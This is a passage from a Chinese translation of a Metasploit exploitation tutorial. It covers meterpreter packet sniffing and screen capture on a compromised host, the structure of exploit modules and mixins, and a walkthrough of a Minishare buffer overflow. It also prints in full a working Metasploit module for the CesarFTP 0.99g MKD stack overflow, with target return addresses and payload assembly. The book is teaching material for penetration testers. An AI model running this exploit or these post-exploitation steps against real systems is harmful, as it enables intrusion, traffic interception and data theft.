我们可以在截图中看到，我们的嗅探器扩展已经成功被`meterpreter`加载。在使用嗅探器之前，我们必须知道嗅探器的使用命令；为此，在`meterpreter`会话中输入`help`，它将显示所有`meterpreter`命令。在那里，您将找到所有嗅探器使用命令，如下图所示：

![在网络中嗅探](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_11_22.jpg)

现在，我们可以看到嗅探器脚本的所有命令。首先，我们将枚举要在其上启动嗅探器的网络接口。因此输入`sniffer interfaces`。

![在网络中嗅探](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_11_23.jpg)

在枚举网络接口之后，现在是选择一个接口并在该网络接口上运行嗅探器的时间。输入`sniffer_start <接口号>`；例如，这里我们选择接口号 1，所以输入`sniffer_start 1`。

![在网络中嗅探](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_11_24.jpg)

现在我们可以看到我们的嗅探器正在运行，并已开始在`接口 1`上捕获数据包。因此，让我们通过输入`sniffer_stats 1`来检查`接口 1`上捕获的数据包状态。

![在网络中嗅探](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_11_25.jpg)

我们可以看到到目前为止我们已经捕获了`91`个大小为`14511`字节的数据包。现在我们想要转储或保存捕获的数据包以供进一步分析，因此我们输入`sniffer_dump <接口号> <保存为 pcap 扩展名的文件名>`；例如，这里我们使用`sniffer_dump 1 hacked.pcap`。

![在网络中嗅探](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_11_26.jpg)

现在我们将使用著名的数据包分析器和捕获工具 Wireshark 来分析这个捕获的数据包文件。因此打开一个新的终端，输入`wireshark <捕获的数据包文件名>`；例如，在这里我们使用`wireshark hacked.pcap`。

![在网络中嗅探](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_11_27.jpg)

执行`wireshark`命令后，我们可以看到 Wireshark 工具的图形用户界面。

![在网络中嗅探](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_11_28.jpg)

还有另一种在`meterpreter`中嗅探和捕获数据包的方法，这也是一个名为`packetrecorder`的`meterpreter`后渗透脚本。输入`run packetrecorder`，它将显示`packetrecorder`的所有使用命令。

![在网络中嗅探](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_11_29.jpg)

我们可以看到`packetrecorder`的所有使用选项。因此，首先我们将枚举可用于嗅探的网络接口，输入`run packetrecorder -li`。

![在网络中嗅探](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_11_30.jpg)

现在我们可以看到我们有两个可用的网络接口。选择一个接口来运行我们的嗅探器。因此输入`run packetrecorder -i 1 -l /root/Desktop`。

使用语法如下解释：

+   `i`代表接口号

+   `l`代表保存捕获数据包文件的位置![在网络中嗅探](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_11_31.jpg)

在运行`packetrecorder`脚本后，如前面的截图所示，数据包正在保存在位置`/root/Desktop/logs/packetrecorder`。让我们在系统中检查一下这个目录。

![在网络中嗅探](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_11_32.jpg)

## Espia 扩展

Espia 扩展也是另一个有趣的扩展，在使用之前我们必须在`meterpreter`中加载它。因此输入`load espia`。

![Espia Extension](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_11_33.jpg)

我们的 espia 扩展已经成功被`meterpreter`加载，正如我们在之前的截图中所看到的。现在在`meterpreter`中输入`help`命令，它将显示此扩展中可用的使用命令。

![Espia Extension](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_11_34.jpg)

我们可以看到 espia 扩展中只有一个可用的命令，即`screengrab`。使用此命令，我们可以抓取受损系统的屏幕截图。输入`screengrab`。

![Espia Extension](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_11_35.jpg)

在截图中，我们可以看到捕获的屏幕截图保存在根目录中。因此让我们检查一下屏幕截图是否保存在根目录中。

![Espia Extension](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_11_36.jpg)

# 总结

在本章中，我们介绍了各种技术，通过这些技术，我们可以利用外部网络上的我们的接触点服务器/系统，并利用它来利用其他系统。由于接触点系统有另一个用于与内部网络连接的网络卡，我们利用这一点从外部系统到内部系统进行了转移。因此，一旦我们连接到内部网络，我们也能够通过前几章介绍的我们的利用技术来利用它。下一章将介绍使用 Metasploit 学习利用编写的艺术。

# 参考

以下是一些有用的参考资料，进一步阐明了本章涉及的一些主题：

+   [`www.offensive-security.com/metasploit-unleashed/Pivoting`](http://www.offensive-security.com/metasploit-unleashed/Pivoting)

+   [`www.securitytube.net/video/2688`](http://www.securitytube.net/video/2688)

+   [`www.offensive-security.com/metasploit-unleashed/Packet_Sniffing`](http://www.offensive-security.com/metasploit-unleashed/%E2%80%A8Packet_Sniffing)


# 第十二章：使用 Metasploit 进行利用研究

利用，简单来说，是一段代码或一系列命令，专门以典型格式编写，利用软件/硬件中的漏洞或弱点，并导致意外行为发生。这种意外行为可能以系统崩溃、拒绝服务、缓冲区溢出、蓝屏或系统无响应的形式出现。当我们谈论利用时，我们有一个称为零日利用的东西。零日利用是在漏洞被发现的当天利用安全漏洞。这意味着开发人员在漏洞被发现后没有时间来解决和修补漏洞。攻击者利用这些漏洞在目标软件的开发人员知道漏洞之前攻击易受攻击的系统。

![使用 Metasploit 进行利用研究](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_12_01.jpg)

图片来自[`static.itpro.co.uk/sites/itpro/files/styles/gallery_wide/public/security_exploits.jpg`](http://static.itpro.co.uk/sites/itpro/files/styles/gallery_wide/public/security_exploits.jpg)

# 利用编写的技巧和窍门

在本章中，我们将专注于使用 Metasploit 进行利用开发。Metasploit 中已经有大量的利用可用，可以在利用开发练习中进行编辑和使用。

## 重要点

在为 Metasploit 框架编写利用时需要记住一些重要的事项：

+   将大部分工作转移到 Metasploit 框架

+   使用 Rex 协议库

+   广泛使用可用的混合

+   声明的 badchars 必须 100%准确

+   确保有效载荷空间非常可靠

+   尽可能利用随机性

+   通过使用编码器随机化所有有效载荷

+   在生成填充时，使用`Rex::Text.rand_text_* (rand_text_alpha, rand_text_alphanumeric,`等等)

+   所有 Metasploit 模块都具有一致的结构和硬制表缩进

+   花哨的代码无论如何都更难维护

+   混合提供了框架中一致的选项名称

+   概念证明应该被编写为辅助 DoS 模块，而不是利用。

+   最终的利用可靠性必须很高

## 利用的格式

Metasploit 框架中的利用格式与辅助模块的格式类似，但具有更多字段。在格式化利用时需要记住一些重要的事项：

+   有效载荷信息块是绝对必要的

+   应该列出可用的目标

+   应该使用`exploit()`和`check()`函数，而不是`run()`函数

现在我们演示一个简单的 Metasploit 利用，以展示它是如何编写的：

```
require 'msf/core'
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
      include Msf::Exploit::Remote::Tcp
    include Msf::Exploit::EXE
```

我们通过包含 MSF 核心包来开始我们的利用模块。然后是类声明和函数定义。在我们的示例中，我们包含了一个简单的 TCP 连接，所以我们使用`Msf::Exploit::Remote::Tcp`。Metasploit 具有处理 HTTP、FTP 等的处理程序，这有助于更快地构建利用，因为我们不需要自己编写整个利用。我们需要定义长度和 badchars，然后定义目标。还需要定义特定于目标的设置，如返回地址和偏移量。然后我们需要连接到远程主机和端口，并构建和写入缓冲区到连接。一旦利用命中连接，我们处理利用然后断开连接。

典型的 Metasploit 利用模块包括以下组件：

+   头部和一些依赖项

+   利用模块的核心元素，包括：

+   `require 'msf/core'`

+   `类定义`

+   `includes`

+   `"def"定义`

+   `initialize`

+   `check (可选)`

+   `exploit`

这是我们的 Metasploit 利用的屏幕截图：

![利用的格式](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_12_02.jpg)

## 利用混合

混合物以其在向模块添加功能方面的有用性而闻名。基于 Ruby，它是一种单继承语言，混合物为多重继承提供支持。对于良好的利用开发，非常重要的是要理解并有效地使用混合物，因为 Metasploit 在很大程度上使用混合物。混合物不是特定于模块类别的，尽管它们出现在最接近定义它们的类别下。因此，我们可以在辅助模块中使用利用模块混合物，反之亦然。

## Auxiliary::Report 混合物

在 Metasploit 框架中，我们可以利用`Auxiliary::Report`混合物将主机、服务和漏洞信息保存到数据库中。它有两个内置方法，即`report_host`和`report_service`，用于指示主机和服务的状态（状态指示主机/服务是否正常工作）。要使用此模块，我们需要通过`include Auxiliary::Report`将此混合物包含到我们的类中。

因此我们可以利用此混合物将任何信息保存到数据库中。

## 广泛使用的利用混合物

广泛使用的利用混合物的解释如下：

+   `Exploit::Remote::Tcp`：为模块提供 TCP 功能和方法。它帮助使用`connect()`和`disconnect()`建立 TCP 连接。它创建`self.sock`作为全局套接字，并提供 SSL、代理、CPORT 和 CHOST。它使用参数如 RHOST、RPORT 和 ConnectTimeout。其代码文件位于`lib/msf/core/exploit/tcp.rb`。

+   `Exploit::Remote::DCERPC`：此混合物提供了与远程计算机上的 DCERPC 服务交互的实用方法。这些方法通常在利用的上下文中非常有用。此混合物继承自 TCP 利用混合物。它使用方法如`dcerpc_handle()`、`dcerpc_bind()`和`dcerpc_call()`。它还支持使用多上下文 BIND 请求和分段 DCERPC 调用的 IPS 规避方法。其代码文件位于`lib/msf/core/exploit/dcerpc.rb`。

+   `Exploit::Remote::SMB`：此混合物提供了与远程计算机上的 SMB/CIFS 服务交互的实用方法。这些方法通常在利用的上下文中非常有用。此混合物扩展了 TCP 利用混合物。只能使用此类一次访问一个 SMB 服务。它使用方法如`smb_login()`、`smb_create()`和`smb_peer_os()`。它还支持像 SMBUser、SMBPass 和 SMBDomain 这样的选项。它公开 IPS 规避方法，如`SMB::pipe_evasion`、`SMB::pad_data_level`和`SMB::file_data_level`。其代码文件位于`lib/msf/core/exploit/smb.rb`。

+   `Exploit::Remote::BruteTargets`：此混合物提供对目标的暴力攻击。基本上它重载了`exploit()`方法，并为每个目标调用`exploit_target(target)`。其代码文件位于`lib/msf/core/exploit/brutetargets.rb`。

+   `Exploit::Remote::Brute`：此混合物重载了 exploit 方法，并为每个步骤调用`brute_exploit()`。它最适用于暴力攻击和地址范围。地址范围是一个远程暴力攻击混合物，最适用于暴力攻击。它提供了一个目标感知的暴力攻击包装器。它使用提供的地址调用`brute_exploit`方法。如果这不是一个暴力攻击目标，那么将调用`single_exploit`方法。`Exploit::Remote::Brute`的代码文件位于`lib/msf/core/exploit/brute.rb`。

## 编辑利用模块

了解编写利用模块的一个好方法是首先编辑一个。我们编辑位于`opt/metasploit/msf3/modules/exploits/windows/ftp/ceaserftp_mkd.rb`的模块。

### 注意

作者的注释在#符号后显示。

```
##
# $Id: cesarftp_mkd.rb 14774 2012-02-21 01:42:17Z rapid7 $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::Ftp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Cesar FTP 0.99g MKD Command Buffer Overflow',
			'Description'    => %q{
				This module exploits a stack buffer overflow in the MKD verb in CesarFTP 0.99g.

				You must have valid credentials to trigger this vulnerability. Also, you
				only get one chance, so choose your target carefully.
			},
			'Author'         => 'MC',
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 14774 $',
			'References'     =>
				[
					[ 'CVE', '2006-2961'],
					[ 'OSVDB', '26364'],
					[ 'BID', '18586'],
					[ 'URL', 'http://secunia.com/advisories/20574/' ],
				],
			'Privileged'     => true,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'    => 250,
					'BadChars' => "\x00\x20\x0a\x0d",
					'StackAdjustment' => -3500,
					'Compat'        =>
						{
							'SymbolLookup' => 'ws2ord',
						}
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows 2000 Pro SP4 English', { 'Ret' => 0x77e14c29 } ],
					[ 'Windows 2000 Pro SP4 French',  { 'Ret' => 0x775F29D0 } ],
					[ 'Windows XP SP2/SP3 English',       { 'Ret' => 0x774699bf } ], # jmp esp, user32.dll
					#[ 'Windows XP SP2 English',       { 'Ret' => 0x76b43ae0 } ], # jmp esp, winmm.dll
					#[ 'Windows XP SP3 English',       { 'Ret' => 0x76b43adc } ], # jmp esp, winmm.dll
					[ 'Windows 2003 SP1 English',     { 'Ret' => 0x76AA679b } ],
				],
			'DisclosureDate' => 'Jun 12 2006',
			'DefaultTarget'  => 0))
	end

	def check
		connect
		disconnect

		if (banner =~ /CesarFTP 0\.99g/)
			return Exploit::CheckCode::Vulnerable
		end
			return Exploit::CheckCode::Safe
	end

	def exploit
		connect_login

		sploit =  "\n" * 671 + rand_text_english(3, payload_badchars)
		sploit << [target.ret].pack('V') + make_nops(40) + payload.encoded

		print_status("Trying target #{target.name}...")

		send_cmd( ['MKD', sploit] , false)

		handler
		disconnect
	end

end
```

## 使用有效载荷

在使用有效载荷时，我们需要选择一个编码器，它不会触及某些寄存器，必须在最大尺寸以下，必须避开坏字符，并且应根据它们的排名进行选择。

接下来是 Nops 生成器，应该首先选择最随机的 Nop。此外，它们根据其有效性进行排名，并应相应选择。以下是有效载荷列表：

+   `msfvenom` - 这是`msfpayload`和`msfencode`的组合。它是一个单一的工具，具有标准化的命令行选项和良好的速度。![使用有效载荷](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_12_03.jpg)

+   `msfpayload`：这是 Metasploit 的基本命令行实例，用于生成和输出 Metasploit 中所有可用的 shell 代码。它通常用于生成 Metasploit 框架中当前不存在的利用的 shell 代码。它甚至用于在利用模块中使用和测试不同类型的 shell 代码和选项。![使用有效载荷](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_12_04.jpg)

+   `msfencode`：这是 Metasploit 的另一个强大的有效载荷，用于利用开发。有时直接使用`msfpayload`生成的 shell 代码会变得困难，因此必须对其进行编码。![使用有效载荷](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_12_05.jpg)

# 编写利用程序

在这部分中，我们将为 Minishare Version 1.4.1 编写一个小型的利用程序。首先在桌面上创建一个文件，任意命名，并将其保存为 Python 扩展文件。例如，我们创建一个名为`minishare.py`的文件。接下来，只需在该文件上编写利用代码。代码如下截图所示：

![编写利用程序](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_12_06.jpg)

我们将在`minishare.py`文件中写入截图中显示的代码，并保存。现在我们可以针对已经安装了 Minishare 软件的目标机器运行我们的利用程序。打开终端并从文件所在的目录执行`minishare.py`文件。因此，在终端中输入`./minishare.py <目标 IP>`；例如，这里我们使用`./minishare.py 192.168.0.110`。

![编写利用程序](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_12_07.jpg)

执行利用后，我们看到 Minishare 已经崩溃，如下面的截图所示：

![编写利用程序](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_12_08.jpg)

接下来，我们将使用一个非常有用的 Metasploit 实用程序，称为`pattern_create.rb`。这个程序位于 Metasploit 的`tools`文件夹中，如下面的截图所示。使用这个脚本将生成一个由唯一字符串模式组成的字符串。因此，我们可以通过使用这个脚本创建一个随机模式来替换我们当前的缓冲区模式。

![编写利用程序](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_12_09.jpg)

我们输入`ruby pattern_create.rb 2000`，然后按*Enter*。这将为我们创建一个随机字符串模式，可以用于引起缓冲区溢出并找出溢出的确切内存位置。

![编写利用程序](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_12_10.jpg)

然后我们用刚生成的随机模式替换缓冲区中的原始字符串模式。因此，我们再次有了一系列随机字符串的缓冲区，可以用于在 Minishare 软件中引起缓冲区溢出。

![编写利用程序](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_12_11.jpg)

创建缓冲区后，我们再次运行脚本，如下面的截图所示，并等待结果。

![编写利用程序](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_12_12.jpg)

在受害者的机器上，由于运行在其上的缓冲区溢出利用，Minishare 再次崩溃，如下面的截图所示：

![编写利用程序](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_12_13.jpg)

# 使用 Metasploit 进行脚本编写

现在我们将介绍使用 Ruby 进行自定义 Metasploit 脚本的一些概念。让我们从一个非常简单的程序开始，它将在屏幕上打印**Hello World**。在下面的截图中演示了我们如何编写我们的第一个简单程序。我们甚至可以简单地在文本编辑器中写下相同的程序，并将其保存在目标文件夹中。

![使用 Metasploit 进行脚本编写](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_12_14.jpg)

由于我们已经有了一个 Meterpreter 会话，我们可以通过输入`run helloworld`来简单地运行我们的脚本。我们可以看到，我们的程序已经成功执行，并在屏幕上打印了`Hello World`。因此，我们成功地构建了我们自己的自定义脚本。

![Scripting with Metasploit](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_12_15.jpg)

之前，我们使用了`print_status`命令；同样，我们可以使用`print_error`来显示标准错误，使用`print_line`来显示一行文本。

![Scripting with Metasploit](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_12_16.jpg)

我们可以看到，这已经显示在屏幕上，如下面的截图所示：

使用 Metasploit 脚本

现在让我们继续为我们的程序提供更有结构的外观，引入函数的使用，处理不正确的输入，并通过脚本提取一些重要信息。在这个脚本中，我们将使用一些 API 调用来查找有关受害者系统的基本信息，例如操作系统、计算机名称和脚本的权限级别。

![Scripting with Metasploit](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_12_18.jpg)

现在让我们运行脚本。它成功地通过使用 API 调用给了我们所有需要的信息。因此，通过提取受害者计算机的基本信息，我们在脚本技能方面又向前迈进了一步。因此，我们在这里所做的是声明一个函数，就像在任何其他编程语言中一样，以维护程序的结构，并将一个名为`session`的变量传递给它。这个变量用于调用各种方法来打印受害者的基本计算机信息。之后，我们有一些状态消息，然后是 API 调用的结果。最后，我们使用`getinfo(client)`来调用我们的函数。

![Scripting with Metasploit](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_12_19.jpg)

接下来，我们将编写更高级的 Meterpreter 脚本，并从目标受害者那里收集更多信息。这次我们有两个参数，名为`session`和`cmdlist`。首先，我们打印一个状态消息，然后设置一个响应超时，以防会话挂起。之后，我们运行一个循环，逐个接收数组中的项目，并通过`cmd.exe /c`在系统上执行它。接下来，它打印从命令执行返回的状态。然后，我们设置从受害者系统中提取信息的命令，例如`set`、`ipconfig`和`arp`。

![Scripting with Metasploit](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_12_20.jpg)

最后，我们通过在 Meterpreter 中键入`run helloworld`来运行我们的脚本；我们的代码成功地在目标系统上执行，提供了重要信息，如下面的截图所示：

![Scripting with Metasploit](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_12_21.jpg)

# 总结

在本章中，我们介绍了使用 Metasploit 进行利用研究的基础知识。利用本身是一个非常广泛的主题，需要单独学习。我们介绍了 Metasploit 中的各种有效载荷，并学习了如何设计利用。我们还介绍了一系列用于在 Meterpreter 会话中检索信息的 Metasploit 脚本基础知识。在下一章中，我们将介绍两个 Metasploit 附加工具，社会工程工具包和 Armitage。

# 参考资料

以下是一些有用的参考资料，可以进一步阐明本章涵盖的一些主题：

+   [`searchsecurity.techtarget.com/definition/zero-day-exploit`](http://searchsecurity.techtarget.com/definition/%E2%80%A8zero-day-exploit)

+   [`en.wikipedia.org/wiki/Exploit_%28computer_security%29`](http://en.wikipedia.org/wiki/Exploit_%28computer_security%29)

+   [`en.wikipedia.org/wiki/Zero-day_attack`](https://en.wikipedia.org/wiki/Zero-day_attack)

+   [`www.offensive-security.com/metasploit-unleashed/Exploit_Design_Goals`](http://www.offensive-security.com/metasploit-unleashed/%E2%80%A8Exploit_Design_Goals)

+   [`www.offensive-security.com/metasploit-unleashed/Exploit_Format`](http://www.offensive-security.com/metasploit-unleashed/%E2%80%A8Exploit_Format)

+   [`www.offensive-security.com/metasploit-unleashed/Exploit_Mixins`](http://www.offensive-security.com/metasploit-unleashed/%E2%80%A8Exploit_Mixins)

+   [`en.wikibooks.org/wiki/Metasploit/UsingMixins`](http://en.wikibooks.org/wiki/Metasploit/UsingMixins)

+   [`www.corelan.be/index.php/2009/08/12/exploit-writing-tutorials-part-4-from-exploit-to-metasploit-the-basics/`](https://www.corelan.be/index.php/2009/08/12/exploit-writing-tutorials-part-4-from-exploit-to-metasploit-the-basics/)

+   [`www.offensive-security.com/metasploit-unleashed/Msfpayload`](http://www.offensive-security.com/metasploit-unleashed/Msfpayload)

+   [`www.offensive-security.com/metasploit-unleashed/Msfvenom`](http://www.offensive-security.com/metasploit-unleashed/Msfvenom)

+   [`dev.metasploit.com/api/Msf/Exploit/Remote/DCERPC.html`](https://dev.metasploit.com/api/Msf/Exploit/Remote/DCERPC.html)

+   [`dev.metasploit.com/api/Msf/Exploit/Remote/SMB.html`](https://dev.metasploit.com/api/Msf/Exploit/Remote/SMB.html)

+   Metasploit exploit payloads: [`www.offensive-security.com/metasploit-unleashed/Exploit_Payloads`](http://www.offensive-security.com/metasploit-unleashed/Exploit_Payloads)

+   Writing Windows exploits: [`en.wikibooks.org/wiki/Metasploit/WritingWindowsExploit`](http://en.wikibooks.org/wiki/Metasploit/WritingWindowsExploit)

+   Custom scripting with Metasploit: [`www.offensive-security.com/metasploit-unleashed/Custom_Scripting`](http://www.offensive-security.com/metasploit-unleashed/Custom_Scripting)

+   Cesar FTP exploits: [`www.exploit-db.com/exploits/16713/`](http://www.exploit-db.com/exploits/16713/)

+   Exploit Research using Metasploit [`www.securitytube.net/video/2706`](http://www.securitytube.net/video/2706)
